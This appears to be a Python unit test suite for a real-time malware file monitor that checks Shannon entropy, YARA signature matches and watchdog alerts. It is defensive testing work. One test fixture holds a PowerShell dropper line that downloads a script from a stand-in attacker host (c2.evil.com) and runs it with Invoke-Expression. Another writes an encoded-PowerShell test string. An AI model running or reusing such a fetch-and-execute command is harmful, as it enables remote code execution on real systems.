"""
Unit Test Suite — Phase 2: Real-Time Malware Detection (Heuristics & YARA)
===========================================================================
"""

import os
import shutil
import sys
import tempfile
import time
import unittest
from pathlib import Path

# Ensure paths
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from security.file_monitor import (
    FileMonitor,
    MaliciousFileAlert,
    calculate_shannon_entropy,
)


class TestPhase2FileMonitor(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="fixai_test_sec_")
        self.alerts = []
        self.monitor = FileMonitor(
            watch_dirs=[Path(self.test_dir)],
            entropy_threshold=7.2,
            on_alert=lambda a: self.alerts.append(a),
            debounce_seconds=0.1,
        )

    def tearDown(self):
        if self.monitor.is_running:
            self.monitor.stop()
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_shannon_entropy_calculation(self):
        """Uniform data has near-zero entropy; pure random data has near-8.0 entropy."""
        low_file = Path(self.test_dir) / "low_entropy.bin"
        low_file.write_bytes(b"A" * 4096)
        low_ent = calculate_shannon_entropy(low_file)
        self.assertLess(low_ent, 1.0)

        high_file = Path(self.test_dir) / "high_entropy.bin"
        high_file.write_bytes(os.urandom(8192))
        high_ent = calculate_shannon_entropy(high_file)
        self.assertGreater(high_ent, 7.8)

    def test_clean_executable_no_alert(self):
        """A normal, low-entropy script with no YARA matches must not trigger an alert."""
        clean_ps1 = Path(self.test_dir) / "clean_script.ps1"
        clean_ps1.write_text("# Clean PowerShell Script\nGet-Date\nWrite-Host 'System Nominal'\n")
        alert = self.monitor.scan_file_manually(clean_ps1)
        self.assertIsNone(alert)
        self.assertEqual(len(self.alerts), 0)

    def test_high_entropy_executable_triggers_alert(self):
        """A high-entropy executable (packed malware/ransomware simulation) must trigger an alert."""
        packed_exe = Path(self.test_dir) / "packed_payload.exe"
        packed_exe.write_bytes(os.urandom(16384))
        alert = self.monitor.scan_file_manually(packed_exe)

        self.assertIsNotNone(alert)
        self.assertIsInstance(alert, MaliciousFileAlert)
        self.assertEqual(alert.file_name, "packed_payload.exe")
        self.assertTrue(alert.is_high_entropy)
        self.assertGreaterEqual(alert.entropy, 7.2)
        self.assertEqual(len(self.alerts), 1)

    def test_yara_signature_detection(self):
        """A file containing dropper / mimikatz signatures must be caught by YARA."""
        dropper_ps1 = Path(self.test_dir) / "malicious_dropper.ps1"
        dropper_ps1.write_text(
            "$client = New-Object System.Net.WebClient; "
            "$payload = $client.DownloadString('http://c2.evil.com/shell.ps1'); "
            "Invoke-Expression $payload"
        )
        alert = self.monitor.scan_file_manually(dropper_ps1)

        self.assertIsNotNone(alert)
        self.assertIn("SuspiciousDropper", alert.yara_matches)
        self.assertEqual(len(self.alerts), 1)

    def test_non_executable_extension_ignored(self):
        """Non-executable file extensions (e.g. .txt) should be bypassed by default."""
        text_file = Path(self.test_dir) / "random.txt"
        text_file.write_bytes(os.urandom(8192))
        alert = self.monitor.scan_file_manually(text_file)
        self.assertIsNone(alert)

    def test_realtime_watchdog_event_dispatch(self):
        """Dropping a suspicious file while the Watchdog observer is active must trigger an alert callback."""
        self.monitor.start()
        self.assertTrue(self.monitor.is_running)

        # Drop a suspicious dropper script into the monitored folder
        dropped_file = Path(self.test_dir) / "dropped_test_payload.ps1"
        dropped_file.write_text("powershell.exe -enc AAAA== # FIXAI_TEST_MALWARE_SIGNATURE")

        # Allow watchdog thread to catch filesystem event
        time.sleep(1.0)

        self.monitor.stop()
        self.assertGreaterEqual(len(self.alerts), 1)
        alert = self.alerts[0]
        self.assertEqual(alert.file_name, "dropped_test_payload.ps1")
        self.assertIn("SuspiciousDropper", alert.yara_matches)


if __name__ == "__main__":
    unittest.main()
